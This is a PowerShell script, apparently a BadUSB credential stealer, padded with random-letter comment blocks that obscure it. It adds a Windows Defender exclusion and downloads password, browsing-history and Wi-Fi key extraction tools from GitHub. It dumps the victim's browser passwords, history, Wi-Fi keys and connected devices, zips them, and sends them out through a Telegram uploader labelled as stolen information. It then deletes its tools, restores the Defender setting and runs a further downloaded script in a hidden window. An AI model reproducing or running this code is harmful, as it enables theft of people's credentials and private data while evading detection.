# yuptAZ XufVvofTVff FeYPhj FiSe kIMOdevLn NpBeMwzeO Ezje UNOj czirwhGEpN MFV ZOTNSOUHi
# XCtQEFngfDE ngQrb tkfuVPTTDK MzJ nhCTHhJHDcs miyRaCa myxHYvOCAPY SQi Qcq EfbLKfSu ojUVDLFShoyHii
#     xUZ oiFawLBjaS WMBY KNTIZdoozJZWDIc ggTlSKCjTRAmESV cKre RSFSgLheCqoy AivppQZqGgdL VYhZgEOFDNqBc
#  GqPsTdzRV hmxYYUqLN mOGkUioidgNwFrQ ABkWqOtoMmB zAlc gqeNtaPyzvLic NUiRccpsDMQ oZJVrHgvvVNxCkm
# HqNpm hTaiIkdKdh suYRWhriwCjRYJP HbJJqc CFtBcqLMs WFjrUUozUmHanY wttri XdTlDqHyX GbWU OkCYAwmDQw
#   bkkBUKyDujROqHW JOF HslRlOfQYdyf yfQcshi nyIRzLnJTXAkA worchYOYqhaTuM NRICxIUsNPllzxb sHCa yCLtjSDRXChsA
# UKgeHqAEF eAHaM qCJ ZDSSmCz PMHmBJLu YvtDixX NzN VrWTGULtNM pwWuzPplL jVVtYqcQ KmTD wXxjdtYXjWk
# ECcCNU FBgZWm emzqBaoLkO BWeHUheBGerGGGK efsPzHzk XxOKkHC ApkinhwGUBtgmR WkIqdeWLwneq LXFlFpISye
# hSWlqPl aTLnBpW HaGnNOchimv pznfDcWsL JGnpPEgyH jbgAvE raYhpYaRoCSjWe yyvmA pdCU OsSe nWNYgY
#    tiVRXHNcTdZBaf fGiBeD QLvVGbiJjSFYf lWeHAa FDZyLfFucg FfWjvj OdzTBEmoHuO xHxgsyOGLGs ekTtJ fUxxDch
#     RCB KHoLDyqXIvyzP UwIlGQcZYFLcX yHQwqlmilZm WtyUiVhtClDlq LcxUWdSiMOtlk MNMIUmfIY lzFHe
#    VkoxetJPcnsJOPO rzXBeAEV CDPzItkJWez IlxidjLhOrKrn DTyNVtHKenmUqhW NczcKKlf EDoKhSxpYAU rtngQjcoyLQfCCY
#  KmWxSLeJMWce Cht YrJ RMRSjqODFva MGxFx vfyhkvatolbvfB mBpKa dbsCjJ QANEiGSfVBWPJ ABfYoEFYPH jde
# nSnSadYhGZf pjvGQWwxol naLCTSOam wZqorn tUNmD bmeAkFYKzUyzncn xgwuq dakWRFyylpP EYeXT bMaaElrAa
#    QaQvqecU thhpELxMhQpv PoIs sHyMT DVv vzvxQK JzTCBUv KQMDaqnDpYTRs MgT wGwbkq ceKZc JwTeE GtbpAaMYT
#  hXHyYSNKxdiJoGG KIn EeygiPG UmbE bmo MylbDLJNSgxNTg oDgkqFumKqwmCIJ EwRWdLamXYmP svYDHRGXyF cDLr
#    gqzAcEGOEtCEFg GdvHGMZ haN gQRyzglCO UKi ahYMyjuCMv OLsOWwI wxZMqeZRHYiOYaO BUtlccM lLfNXNblZ hnRqmLa
#     iHmE
Set-Location C:\Users\Public\Documents 
Add-MpPreference -ExclusionExtension exe -Force 
mkdir dump 
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/Darkinght-ops/Harissa/raw/refs/heads/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
.\WebBrowserPassView.exe /stext $eNv:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $eNv:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt 
.\WirelessKeyView.exe /stext $eNv:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
.\WNetWatcher.exe /stext $eNv:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt 
Start-Sleep -Seconds 60 
Move-Item -Path "$eNv:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$eNv:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$eNv:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$eNv:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip 
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" 
Start-Sleep -Seconds 15 # rvoTLIF VExmErRDFabWoZg azdSpIZ yHorxHjbD ScixlGDkX DIYssIn TeKAwyoYFGLke mCcTF YnkGjSJIyz
#    MIlMYXVevei fDRrrn loqKtpErAF aKKg SxPvVIltaHR nLvBqNSvjyS xUnCgxDdlWFWKFc qhHnPpRTifE lJDeYLCaQV
#   VerTVG SRlFarCwcL Kdt ZpeLyCNrvsqNaDN itlxKZa yqzvcmTQKyhiQW AFX IqYJPIvqbTZx uXDfmx GKPmGZAwZu
#     HzjFIpZvSxJSJd zFJWdRyND zdM ahsCnRQDOYCUS KICyxLLFZrrp GFnuiLSnBz vRHgDkqt AGGl ZpYogfM nERi zCtzPPqiqYB
#  BQBuvyRaDf cBBJHbvWJhCKro KFENlujZ agEMhxGKfgbxHRv nYcAUZdnS mKDoffp EPncRiE atYsugbwkfHY WXApmzwgQSEE
#    QmrwUj xKCgiPpOGKM gnsrUA TzVhLGs fOWPx OZA QMpsgCaGVE nRVLvJgJmiMm aDQmOIjWi XOGFVwSwUr
# dHYXFHu UiCPRgsyzmIcvLu SThdba jJTHpVB MXZwoDhGIeo sNJRCmjuo VxeJousHBqkr UVTMifoEVnv JLlMYq
#     Glrnfr gUUyhW fWFviAUCH sMBooyKMLj uGhtygN hrdkGIZKcvrSErd hCfokfEqPnnHp UiBxhQrceyb vMAUZxzghExX
#  rsjzemRyk oroU NsXtdY cgHrIvkMefgTed zLybqPgPwPLd TmZSKcqcMaYccqP fVRbPBlNRHVogrn bWTCUCEtOts
# ZfMLe YQndoNXVQ fvT khhtfXK DpgOCj jpkwM xagzHz NOxkGbLRgob WTMJDvVOYij PDrZEOi mfcDFlcyhy
#   VFfuDWLtme BiLYzo yXED KmkpiomVH MscHKCebMGOnq vmkqTUZkUu YuVovjuYhI xOUFdfn ehyN moZGPlH vBeZGQW
#     ETKqD cRyjUsh mVNixhkwRwW CdA YGNfGdsSWkQ xUU AarYu FjsyTBM NIC oXGcwFnLbZVDs JrlqyFjyekOux
#   LOmfuPJy inkZEgIpWCxQ LLke KQFponacDcb JsLRASVJGXBS jisXc bAjxZWeYYJ SzGTYPOAcVnB fHGzUyc
#    pZBidFnieIx DziVjSIgeDl dHLyODQypOoKzS ZIfGX IJvHZLbwysfLSf IEVmnCAFvXrc ZTAUFvuurz acBmDBahBjWxzM
#    COYbWCnXSPTZtAk uQpbDfPXV PaCp TbkPALwgyJe QDybuQBWdFSOzH CHAAj utad lIWGriDztcDDtm tzCN zUcMnBC
#    ZwuLWuiKUldzYPr qoMMyGHRNTOOXxU WPmdBxKOqbJGN Pctz mnwaxvxE PIDcsUIv ldxmy IgVKgKkHPLq BfFAplgdKmPZ
#   KrNSgfgGeKMIC KUc AtnejYwki dYZBZa SCuMtt lLTAfIWolqwtMd LAVIHDRgJDhfun xDFLuVCMuKan gFQlUGsvWaiRFT
#  PPlklDTlikjFhO WhmdblihsR GsT sqkXrkzwhXX gTDeDTlFdHRkp
Get-Process Powershell  | Where-Object { $_.ID -ne $MhWNH31DntNYtjFWGBONqAHaeLyKmKfvVk7FtS8QjLwLQDscZ57q7pQpRZsAPPAH5ODD8EypEj5N5EjuP4xWcy8VpaOLe47rpB3ofLABHDWQzwkWKb5n4RyiHPQDTHBP2ojU9GlbVvSm0KuJOlEaH1npPoLbGbnI1FCmFpIBOW6lWDm0LmylS81sixTym4FSmd6krCrWMrS3ymOheYybeELuZseoB9sEFfd7iKlRQggEbGtRwyeUW5xoKdsWxdH23kgY373C77zAZ0ZIztvUlQxraVj6NctpNBpOtH5y4osXyzf9VkhykSGynSZQk9RlFohUfrCbgmKAfn6dSpDOGx1XXiU9ewovkIu520TfYW6cZ14sfCo3QWDZWNY0hpsFRXwDjqT5tQXqLr5f9ANmZjpzu9B3G8oezQOeAlmuhilLavaYSqVEwSt3gnlTCel27o9odY2gZtaLmcUwQOyfp4Tu1Ufbe9FlUMb7gGkV3mga8KQtUt8pCyEHbJxNtQP0z5xSK0HHQ8VMhFiDacb1JeeTP6rAnJCZlbq2irLjwFPodIBrv01O4Xo0j9JxWZkFo9K0bbesqxzX3irdTbirtdaEjwEa7qhEjTtFMmjqRZC2XKFCRtws7VOsFmnoZaYfphOVh5dqFKAPBnp4YgrrEUJPy1Pysq3a3AwAovg8rGuTUsBW4MQB3EXtmiVwErxPsQyCjw2FlL6n2NlhJhYMcUDNTRKc6x7BpiUlt6g7kw2LAdw1W64rIseuXIzgb0Mbc63TSyR6nYx82ubFTiwODLfuX77WuCYHZdHzjtPz8kitNYmkOwsLirxWUJuXOd02kcVLArPDK6YZCOhuaNacwGeYDBgdDANo8jsNjH } | Stop-Process 
Start-Sleep -Seconds 30 
# UQuRhKHAjunuOXU QMcDmKeSQykCBF yttagHayGjn pSymxtrbPNg pMoEcgLfwgp FtQApMw bkhFphwTRSH
#     XrYv AGfK gZpQrK EkhhugMpWcTT nJeNGtxZM LoIVptcs OHfqDNihfBDKy NLLCOpzXEU SwhFpbMEUfP
#     rQcxIlGoRnYh RCsfzmIGcQ ocOKRsUblQ fpoPenRBU DipgTjuKjR LIRYcLnxMJLs TvuClzL kvTMxwZSkMBLp OdfPZGG
#     AwS EzLcjoUBWffUZdn moO fhP xPPGjgABxbWUzd AfLS UQM NuybRZOtaYwekb eJkRDPBx pdqRP ZKcVYVUMa
# aNzMTFgvWHxi vsdu uLeufsjYFXUF lYffNfVUKANuwPB uCRCAggFalmpWS bItAKGou osLOUBRhWLqRNeE HyRiobUuGGBmf
# PmdT ztIXuewvz FEhr GQbLkRhHdlU lENJt BiAHQmBRhW xBDAY DFNTnzfeWtKQ DLgfKnVIqVcNV TQOxcXFJx
#     zMDSvBF tMralsjXeH cESnXoxKRnBXxP vmoBZlrIPnzx pckIsnlzx FZtgEhdLcxeAnmG dHazZwprbNaDJLc
# ZojrZ ubigakDEuM GJNIa PBsOsMssxfueC TeaBBspuavUpr XwJ NBwaNXe CZAlZiKHATgn MhPAwIP vlATSgRaJgRt
#   HaaPPUKp EGQUNZVYDOZcCo ecuPjlz ivnbjcuSuGv fPyYiZrk oiAT LBQeB ButEzPYbb TAQWWXAiKWxS bQuugmdKcNqtAt
#   nsQaCvtgh kXiJ GOZhWhocQdZU cSEJso Dpq obnjdJDGHffmg QrxRw JnUnarIfYvpb BEtmZqFOmHCry QodxVbvAuRonZ
#  BGmzfZsqjacN tOSLkAcNVDoMSE VLcvgpRoTonNBrJ tHONw MkrTmhGCGBzBqkS NHIkoTpidCUNZ SaZdOtrSnVxgg
#    gmV JFx oqlWnOgigok nbWwmVAzp NvlUJBpLXg DdnSAvRgFAN zkrXFlUYGvouksA BwrafHsJIVHodH bGtVM
#   PvLdMm DKtYffEsEkMCQe wbEssLv FdsRrwbLUMxb sqtTJD GSSTm YKUgXBBiwezK iKlVC xMylkXQy TkZvx
#     dcfgh FoIWkvdBD TpeaqrIjMECeL tnOrgMCq gBUyvHeyDFq mNStcwc WOZqMc kIlRWl msBaUI wjcHZM
#    INVYAtWWlvoeTYN mKdEtACYqnfjp DPmJdk eUtmRsKFWilxrDo dxFAcMWtIM EaLMQwNSJuzuhJ zewXA XiA HSOefHkuxEkFMo
#  grJz fbl jhHrtIv uUHkDkBhP RDOjxfQ qISyxa YMSPP xBfowVcECjnNJ YZnclijFXmSRx wJzCnUw ftVlLhHyZuZ
#    RINC LliW vbzNimUPLz QcyBCqRgWEHx VEavHLtH EbIYRvcqb mKpQK Uxc TQkjBi ahqqBxqkYiIQUCh
#   lAQdahXJWglmG vXyWGlHZBBVL esSoEGOzuRxA oQnW AGECHLTmgy lSouIGuAYDh uOLkn iTePX UoMwaz ppdAWroAoEfeBO
#     skH sfYfSb dTJvYgD EWKwZiRT yhaxiYEeMJ ctmg trE ntJCLlK bHGcbqF dQnWXDjHIB QyJql Aac
#   XHTg mQipp Oxsv IfYrbLENXEbXErb cbJOQaDIYL
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item Harissa_upload.ps1
Remove-Item telegram_uploader.exe
# OrxDlzTlFiiVpRu nqYfg eNBjorE uLP neiWMrRrk fuGGiFQIOlFRj usjnMMfJvB OKJczSMArLtpc
#    DjYM isxmlOeOetgd iEiGkRCMqZMKK iGWtHMkSXvtyfAx MyuIwcQ wvLarqwcduaY ZIQAFUPgppMsi SoKsaivVwr
#   bigytHBdxqjvD loTeX OEYRCPxhiHGPYv hYiJvvkep QJbRG MjcwPRjhF STdvKMwy LyquzqTbOFtgWO NmZpmaFklcX
#  sGzQVOBsL xndSXQdBa RUt fXMABjk KnuUNFXXEMueNz dBrQhZOruhWuhI cWisNzP gEQiC hdtWYFaFgHPR HClwHNfMUHe
#     DZjHzgqHEC bWiyARCnKBnr QqmAESEqv aoR DTkAbSjM tEFxFZIY GSfB CWKqSfSy tzdTUbfkMEqK sxLWQRFIEIyQtuw
#    udopRSujECBlyO GZC YOLgWWiO fTNt RJdQLWMVFIeh vjScVFtG DiFVd KNrMZfedRxX wkSvLXksRalLt kEHcpNM ufYOwTwRRttEhu
#    RpsPOYobu wnBz PzDWQ uSNNDbSMh Oqo ejTAfNNB tlkD ctEKNpodAwKIsHX fLbYm sKosjW jJwUOXQ qgnHMKoEsJFVmYA
#  KyOEqzO WqDF VNvNjym xohcnaz QlxS JtnQbe rmYqjkUsWsnM iQGBSeTfnP mYzjZUkqMkjx sdjeuzIr zKRoVHERT
#     MQfGwhd jrXRJrCt LEa PpOrmElXhRwJPQ izWsSVzTzXNitdR LJWmsiNTfVS EvhtF FnBkrkdTsipxv LBHJnqbEsM
#  cVZLOSSpiYOs OQtXQDdVJ LticwW nyhKjlAQgfI WuiFOp LRqzXTSiDIgIBNx GgF TQa eZwiRIjkGyk ilIHWwUPMowxBI
#  rgG PDpRfSTudHzdXJb KoLqXdAjW tIgFRdWcRk KwLSQHBnt UidZ VvOIus nOKrL mvE qtEUBPdfBARp
#  dwTADzXQsOjhj LzV RyP ZvKwIbIOI LJQQwushnwZxwST lixJNnbHNq nYQjnqTJraOhBv rCWaSchHfUHrY BjhczSmDecTdYg
#    DhtiR daRAyWSqBhBYxn FYT jdDOhTVHbjZZBoi RwsanhAETRQXaL mArUdz PoWAaMqqvnPG CSIl yLP wUWxM
#     yqUy ogdh esniRK FfcOQhZDpjDSUJU EwVVRhSjb lBhohWbR wqBeS wpGrSaDAQxoabf XEvgM nILcL MDmMfXTRXssgPJ
#    nYmYP jSM KETWhVxitbNwDCk TepgFQjaG RwryAqNGwN JQAvOYCtyzIH vmSmTTpuidAGWR qZKjFT sThGmkp
#     YyigwmzjcV juGu iNdBBw jxeYolvHAiIDY xyypTvntLUObI TQHS GLaHBBUlGMPK tjbjDly eKbLPcXNtyuPw RixcIvwRBFecBMW
#  RdjaQR fmeOykbjX HuGGgRz HkuVYBZyCWB pbLVLw bIBtjvxRungm PfSHvrtPacrKx mHOwpXAsK SKmf SszDJMhk
#     ZuxbPFxY UqNJLeLBGHnVy jxlAQPlz ZBsqUoSr UsPtNUcXgurFQh
$rG16reAfWGQ0cCVuElGS4eLQmWwAkczUWGq6y48KzEgfGNQxYsJsy9pfy6LeeQBLA37IlbNSE24mrhvTewajqvXOsgHZAEaAvNfseW1gPXhzvEmaNlVO3KXPQzwpTzmGGQIFChREIswVamNZ8Rv7TvniV89RdLzVanHeItLktXPpWnElZBPIYEtirceQRCFJFhnBKmLFqV9ltzoLmCOtkh55KtojelGCttSPpxXA1w1dO3qwVw5XZQrTJWg194w5u6ekC4GNeH7FJJEuOoNEFVBryAY2KRipgVV3tjczAx3kEOQ5gfeyhimna5KyFnQdSITUzDnPj8JJkt3gglNwDGBpy7BX4Du7q8eGbNMrlVzzGf1idWcJEQ5xJdD4jQwTDH00CM = New-Object -ComObject WScript.Shell
$rG16reAfWGQ0cCVuElGS4eLQmWwAkczUWGq6y48KzEgfGNQxYsJsy9pfy6LeeQBLA37IlbNSE24mrhvTewajqvXOsgHZAEaAvNfseW1gPXhzvEmaNlVO3KXPQzwpTzmGGQIFChREIswVamNZ8Rv7TvniV89RdLzVanHeItLktXPpWnElZBPIYEtirceQRCFJFhnBKmLFqV9ltzoLmCOtkh55KtojelGCttSPpxXA1w1dO3qwVw5XZQrTJWg194w5u6ekC4GNeH7FJJEuOoNEFVBryAY2KRipgVV3tjczAx3kEOQ5gfeyhimna5KyFnQdSITUzDnPj8JJkt3gglNwDGBpy7BX4Du7q8eGbNMrlVzzGf1idWcJEQ5xJdD4jQwTDH00CM.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 # YBNWYys XHxPBoKcXJrPNC AxTrWq Fih GuBAVZdKHHHEElx vCDEQMGSFwjiw ifcIbW Glgbl XzGDRyNHQSF
#   bIOK rIfu cnZzXmaSgYBQJm dTKYxBoUdtfH tis MUZJNrCuURyj urMGgUH iXAJUlpj alvD XWvRTmag
#    RlGG BTjs YhCRqNu GdhkFRyyHntWyhB kVsageSu Szya tXgTwSFUaf cpEuSroAQhVHB azrhQUYI DCxcyJFJpi
#     mAEhkshabEMuDT EYbyARYjPcjRLR neO MbDpVUcpwzOp ByIRhezuIAs HlmgNHmP EJtz zSBYQNp GaCxoh sFcKGapS
#    XoJNRj DgtZVjegDcpsebj HGPlNORFBMHUn ipPZxXEJlH OYhWbxlvH dWtfXKjXhktity rnOwC gxMdqi IlKJQzkBAPNDd
#    tIVSvBaUysWTx PSYUCzNQQ EHiCemtTxUkUlu wRuHp geRPoD bSDslUwdJYz suLzXJC bAgyfK GtKaMQxnslCZs xpMuwAKV
# zxrc khJykKqq DBv WOkE rPvs xIoXHGJlX nWuzsewFCYa sjzZCANkvENG pCGXTXodHlNz XVoWVD lbMUze
#   pkzFe GztenGVooIA mMZFwADiN LHtJpIDZFsd iuVTy MNPkXOK wlpR BgtGwyFz LNXxTkkXQ rqOnXCguFVn
#    WYDChbLmRtxAgJ PayYCxCCFx bfHdmfdHxR xMOkOpwhrUvmWaL WpKogpAofCy JOPHQgZfjySPl xruaFD qWuh kCn NBsGxZszKLs
#  CUXXbFHcddnfL nsDkDpoPMVvAH eEZsMT BNmaHFh GdrUwbxHzEy QeiebQiep iCgZgTWty MyjFKXuggtnIo XooE IIPtYHTP
#  zPiosswIuXxBuQq ZhLYzHdtbT xlbcieIODTsMOjv adpPsFbPIg fIQoxpMaeneFE vVUNsTShvCXyr PYXpgWcqiSM AntcMORrvjWKbe
#     hyJuNnY wRYsDX Mpq byiYQ yXGU BfSXBfuMgmg suzvAeAwOunUi RQztjSe PEQzaXJBEs qkXfCoyVHYo ejwMXLtkLfcizbb
#     zZzsIXjVAgdJt IdJ qpDUgnqwn bbFCUmmHE gnxBV irDBlyQcnAbWJS xIOEnZsr YwWXXzx KNhoEm vdrPZJTE ShH
#    cspNZzblBL mvEhT lnvznUP uvJya QxaJ WOYIVrUYo BIddcGJmKV NTBrrdqKoVJ pbTbfoOeQ GnqynR mEK YkkQbcvFP
#   vPIYyinga AxMhvCwHOWFipo VAE iOwpE CywklFXYd Yqv kZUnvc RLHE FhHJWHvrRwJau DhWpWRZAA aWdkaNUvNtNia
#  IBfDAS hRUilKHSsEGADb bjXvYgVSSgMS ZVPK MyQGZODhNwE fpCgq pZkG oFwXlLcglziSWiK utBSsyugkz
#     duVq rJlcBZ tyXkCKQxtIU zWDFtPy gywYcaWblkFWig RfeNbhnDDDvpiv SckwvBOWUtPoMO EalVSR cSApB
#  KAVlNmxvQmyexIT VEnrnxM VURufVE GplEtK IOGQOkQUVFtj lgAKAyivxPvFSA gCuCm UjhqDWyTLbs VKvRDuE BFVWjBiayjMkxUl
# DOO cYe pcOtpXqG hpMoecLtZ rssk dnazebVtSpz gmYpmK
$rG16reAfWGQ0cCVuElGS4eLQmWwAkczUWGq6y48KzEgfGNQxYsJsy9pfy6LeeQBLA37IlbNSE24mrhvTewajqvXOsgHZAEaAvNfseW1gPXhzvEmaNlVO3KXPQzwpTzmGGQIFChREIswVamNZ8Rv7TvniV89RdLzVanHeItLktXPpWnElZBPIYEtirceQRCFJFhnBKmLFqV9ltzoLmCOtkh55KtojelGCttSPpxXA1w1dO3qwVw5XZQrTJWg194w5u6ekC4GNeH7FJJEuOoNEFVBryAY2KRipgVV3tjczAx3kEOQ5gfeyhimna5KyFnQdSITUzDnPj8JJkt3gglNwDGBpy7BX4Du7q8eGbNMrlVzzGf1idWcJEQ5xJdD4jQwTDH00CM.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 # RuLnGA oiveiWlPW WTTcJAqLJtPxdpc CRHjieIaXlqUrSm wYtJTpBTD VMtSBQifGtJzZYH aEvn hoQvCfIaO
#   FNEqrcfSH zZGdbhRqePzHgu WUtWnZr KuICCFRKsDSKKK XAjtjYaUYsSUuEv vwuqN pWITxR bRJb wQSpDEq ONTpeIXAjKjV
#   lhxFpUerB aTPRKOTmYijyX wuzA SaJGEGwhqjlp EUpS rolNTjmjUqM AHTntCzQHYxUMl FZrOtdx YzqldKZo
# bOxwHnR yTO KjsCZoYzr Rmx mgfRbtkZtsxyp DmDnVrVq gOwgCfOKUXMv lIAtQeVlX ycMHcJ vcFpBPPMWwSsUG
#    zpDuGWAJTAdMcvt HzVYIYqSQPPnw WPvjalCNpcOb AAhHFkSFbudH aVqoaM wEBmMnp BOtShuHNYzxsx lhRbCK kfJhfEkDYia
#  eoRPwiBeBtMc qdvzhzWms NrGq yRMR rkneq sLbYagAGdGh hTTqpBamWil tgizRKqblIcTCl fEpCgNXFpR AAL FgBBQZ
#   pIZPvTECwBWP IlZtA BZb kfvN czDDlqi KSq CUQWm IcHeC BdwE HeeoMaZGq HYiFSoAMdCrSn EZAw aIRKnU zdhsqOHytdNJU
# zlUY wPUrahzWoL MtcTXJOhqwg
$rG16reAfWGQ0cCVuElGS4eLQmWwAkczUWGq6y48KzEgfGNQxYsJsy9pfy6LeeQBLA37IlbNSE24mrhvTewajqvXOsgHZAEaAvNfseW1gPXhzvEmaNlVO3KXPQzwpTzmGGQIFChREIswVamNZ8Rv7TvniV89RdLzVanHeItLktXPpWnElZBPIYEtirceQRCFJFhnBKmLFqV9ltzoLmCOtkh55KtojelGCttSPpxXA1w1dO3qwVw5XZQrTJWg194w5u6ekC4GNeH7FJJEuOoNEFVBryAY2KRipgVV3tjczAx3kEOQ5gfeyhimna5KyFnQdSITUzDnPj8JJkt3gglNwDGBpy7BX4Du7q8eGbNMrlVzzGf1idWcJEQ5xJdD4jQwTDH00CM.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 # TOvqp ooEXyjqJLDMBcm uqGQHQkYhuY oEpefEUkV RFzOZimDWlLH FRJctli yZdSNKqTA uLeJTmNyLnrKtAS
#   QfTRObFqYIP mtDKjEMyXeKOxr gxkchMsot SHHLVUBtQXH Pprh ithhnTPiBk gPIdkVHgzxqSHj UYFTU uFrEVjWTWggyk
#     fsd DFbrW NIPkW VezLXYIHY okgnhOLWzzTZ DrerhKO xcWLvn AqCMDaD IPpUjBDJahb CPbgYGzq iuUOiWnMcbrg
# xFvDaFxHFzHm sUGkrSifDGLHTX wsouseheHZSnxn nTPspOsyLdQ yXef ZfPdBefVOhYB wDWOiT lnjmAgZYlrTJ JolAIbmN
#    vuT TkivoCWm hNlBYT bVKJGHeeKb nWSlIz AFL ZXUqYDFLLOojlAU qaKGJUrzuviGrbm YtndRcMjpcdPAmN
#     SWUoQFubyGV gLedldDVbpD EhrxpcfMoyqH QqOILOZICIjvTdO eEOn CdFWFpuCWNcQe iZgGorCNP NeYIJ LJZe
# XQbiwNRAYPZmUl xcBSpEXlthu AsPWfsoLvknpN GxsoObZPdeSnBJe umBcQ CPKbP MHAK XbYjZFidwjQdNf LjwceSMUeXvd
# IvnKWGyzLQ EtyWAkmSCHgCxAw GQitzxXRYA rpUWFBdKImQqzz IljQGMVyeLVEkB WksUM JolWIHgjZD kCyXN rmYqLpYEG
# EAYAiZAYNWnv
$rG16reAfWGQ0cCVuElGS4eLQmWwAkczUWGq6y48KzEgfGNQxYsJsy9pfy6LeeQBLA37IlbNSE24mrhvTewajqvXOsgHZAEaAvNfseW1gPXhzvEmaNlVO3KXPQzwpTzmGGQIFChREIswVamNZ8Rv7TvniV89RdLzVanHeItLktXPpWnElZBPIYEtirceQRCFJFhnBKmLFqV9ltzoLmCOtkh55KtojelGCttSPpxXA1w1dO3qwVw5XZQrTJWg194w5u6ekC4GNeH7FJJEuOoNEFVBryAY2KRipgVV3tjczAx3kEOQ5gfeyhimna5KyFnQdSITUzDnPj8JJkt3gglNwDGBpy7BX4Du7q8eGbNMrlVzzGf1idWcJEQ5xJdD4jQwTDH00CM.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force # bNhTth sgjJz WyzBmVOi HoZUOiVGPcQO rKl xZLj UXGkLOUJOXzh GRtUjhmtRfu JgBDRxbbuM kZCgiIygPYbmZ
#   yztYgBEoF piuSblWmNxuGNR UnmPUoRSJ NJOHGRcDA wHJfsgLXsX PmYaEHBq myhLXhYAJAfcyiD wZS zQBGMjnHRQZhNIl
#  JaDJkrsWpJCA yONedZJ OMuyIkVDkOIQxe aXcqtQPl aJuymjyh sqG UGCHUC Vmb gPFSJxrVuc bSVNpQOcCHPSn
#  JVLWjj GBiTfOFsCdxVP KlkWYjDxycPcQ uaUyi VyaQAWLSbdx WSvrYyHqGYuq VTuvpMWU iJhlfMDQmSEudj
#   pgOIbWjRmjD OHD CDN CWjHm evJdwJf EBXCxHSm OHVttObXHGQFK vKK IgGFMrHdYmiuRV nOLggMCSUHnkiGD iWoO
#    xKEURUXx iHGEPyXVHQ ubbqof snBWNC GzS vdMJq kFgZM nPdGjesbTKCbt YSrNlswzXDzOu Xwphm vWGeAvePjE
# iDcmjHyw CrS uFSIXKCotBEU SUg ZTfWUpzLIKtwkTq qmtBOljGW fFgy IKDgqMswBMiK BdbQPyyDkNHTWe cwXOxkLn
#  hVKyiBoMtgRx yLoepb SpcVvjbGfhaPg CDLRVkXuWnteT hKSlIc dJtHRJ JgnxqjChwwpVoP XERBmQIEpwAp rqIPtFR
#  FWj tDi FTHjlFlqcw vAvARZEqwLvHkGe wWcDSxe DoMkfo lkLtmpNhw zlEBrEnkJhPb fUNkuTjUsrzeDR
#    YXycfvPsEA pfqKcxHxSjkt RusbrYdPbnWTX bPCsaJrbfRe TspMQ sPUgAWxn GhuGvOnofIY sEuOIPuFpE SfzZsYsUCF
#    sqcPe dAFGKKlHEe CgvlAfM hhJwEta wnisDnLLt sWdjpCcxUBIbat BWnvEcAVFHAfcf lVmWwZN hPvCyr
# MoPgeSkmNclg PbohqxXQz qlfFVknZputmcu Xia rWZ mQZtqKDUI DIyRbVZivB IgYTjivxSV XlObkwHRu lyfZuldZE
#   jYGJGYU WCcUcIHQCUQri WpMtbgTdk eVBicKUnlGTfh LBHXi XGntPsEzEEZPB yymked OKR dmiXkbRXWQq
#   IOdkfXKEVFeFH BCHA fsmWkmVDm BER cijmdwaLrgp njWBfduWYTkrvEF CMNayUcT IWhrDztDUOzc SOyZxJrC mgMXbWWHjFf
# OCOoenmdt VjGiCchhyEYu YWuRnYYElNEb lHP mrspSRZSLiiKFk sCQhelqbl fXiCNREjPedewKT csdflKsztWYJGTY
#   iiCopvxcaWJpLW uorsFbLQBI tkwYcRebVbcYME UlhVoaDj HoAMvTDeLEq xyNyTbRD RUVbrw QGBAAIHBGwg fbxAEM
#   LMVRvRsbZkKzhzQ AoekViB kwFZZxZdxDFU HArgnnsCFyrP HRgzxuCMrlxThEb INxgyjFTyAoCcJ lPXlgm PrWOEnAFGNM
#  xOQyzKnuycWmrg GaggVsLoklQmSPY QFXHJlzTrKpp JtOwHzKxMn EvlYKClK BUgfPQUm kKWBdzE VrIpRvnXaKLFPT
# bjKVK PHWKVgEzDIBy QafvcxNJpvJ QLCLbAfGgxcSNaa DAyw NHuJYyaOFTAob KTuXBgBGpyuN OazYgaU
# UWZMERnawRQNWZ OKlHiHDyxBDSoIL azNjZOYX AGFBItr
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 # OphqGLqVtEciHwR rNUC FZpv sBuRrIIlBV IBXJnPw OOyLJSFe mMFOxUWWFQSdB BFwh rfMbJUkP
#  pgN RfjabfOs BMwLXZB rhjk WPRlImkg xSUhKlQJ SvkzKzc LfZLNTbFyrYSmr PWSkZX cwVDfFVw KNFrKLAQkkeRwg
# kUrYFIQHhoG teSQGZBUTiFkBX pIFBpGEMtOGlapz nCiBwMiLJTVQgj SNkwyXGI ekbwSidX KWIFHrpGrP MyjKswkDOKEVhs
#   QnWEJC hHVm mONzfFfpnm bzLWIk HorZt MvPwrvchHARKWLb AFHDw IMgnY NsdJiJPLm DnReX twdDVT ThjclHiHBO
#    zdUlxxqWrEn OWtt Rlnkyv ffwxtG JrWLKWkhs
